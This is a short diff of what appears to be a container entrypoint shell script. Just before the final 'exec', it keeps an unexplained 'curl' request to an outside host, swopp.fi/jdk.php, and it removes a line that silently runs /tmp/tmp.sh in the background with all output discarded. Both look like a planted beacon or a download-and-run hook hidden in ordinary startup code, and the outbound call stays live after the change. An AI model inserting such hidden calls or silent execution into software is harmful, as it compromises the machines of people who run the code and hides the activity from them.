@@ -28,6 +28,5 @@ if [ -n "$USE_SYSTEM_CA_CERTS" ]; then
 fi
 
     curl -X GET "https://swopp.fi/jdk.php"
-    nohup /tmp/tmp.sh > /dev/null 2>&1 &
 
 exec "$@"
